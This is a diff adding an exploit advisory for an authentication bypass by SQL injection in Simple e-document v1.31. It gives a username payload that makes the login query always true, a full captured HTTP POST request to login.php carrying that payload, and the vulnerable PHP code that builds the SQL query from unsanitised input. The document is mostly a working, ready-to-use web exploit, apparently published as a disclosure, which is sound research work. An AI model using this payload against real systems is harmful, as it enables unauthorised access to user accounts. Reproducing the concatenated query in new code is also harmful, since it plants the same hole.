@@ -1,0 +1,43 @@
+##########################################################################
+[+] Exploit: Simple e-document v1.31 Login Bypass                        #
+[+] Author: vinicius777					                 #
+[+] Contact: vinicius777 [AT] gmail @vinicius777sec                      #	
+[+] version: Simple e-document v1.31			                 #
+[+] Vendor Homepage: http://sourceforge.net/projects/simplee-doc/files/	 #
+##########################################################################
+  
+ 
+[1] Sql Injection on username field
+
+PoC: username=-4731' OR (2708=2708)#
+
+# Burp output
+
+POST /simple_e_document_v_1_31/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/simple_e_document_v_1_31/index.php
+Cookie: username=-4731%27+OR+%282708%3D2708%29%23; access=3; __atuvc=3%7C3; res_session=5mYRbQ67qPN3Zx%2FH%2FPKLDcSgbu3FmjzVAfezt0G0Hapsi7GRhIzlauDhsVpWaAeOu8MAa2wkiyHTT%2BGemuchDNMd1kQYMKbXSp6MFx8BS6A05M%2FIxw0vP2XGGDE5iSzrDERGO6QQa4pOXRjpMD4aYL8%2BQPCj98JZrngcZnhoEFWekObo5EWdnnuhg8zpmWL26dMuzY9uPu%2BO60BwSiVU0CCrFKxc5lMkSH%2BE9%2FwxI4XQpVE%2Bb9X4StmPGMMiZ1it0mJcChZdz4Mku1WJcOrzLVN0RYZYIvARwBiMXdGf%2Bvpw%2F0MHPP09fBv0PRgNI4XAI9apbQ7RLlxK6LneiNaR0epLS1YQiRpucBxtI0AiKofvOK5THZM6KSenIxsqUsrSxtff6eic0prlZb%2Fvl%2B3unAIgFdcAREUhQZ6lytABxA3CRMuZUmb2lyU7cWb%2FnyhQ9BtCXtfSTrdJze6JIFxsFg%3D%3D; __utma=111872281.1068821941.1389863798.1389863798.1389863798.1; __utmz=111872281.1389863798.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; ws_session=cbm4nhtn24jn9mhfvbjimjjl55; PHPSESSID=unqjr3tdi0tbgl3if801atjhl7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+
+username=-4731%27+OR+%282708%3D2708%29%23&password=&op=login&Submit=Login
+
+
+Vulnerable Code:
+[+] login.php
+
+$username= stripslashes($_POST['username']);
+$password= stripslashes($_POST['password']);
+$r_password = md5($password);
+$sql = "SELECT * From edocphp_users WHERE username='$username' AND password ='$r_password'";
+
+
+
+#
+#
+# Greetz to g0tm1lk and TheColonial.
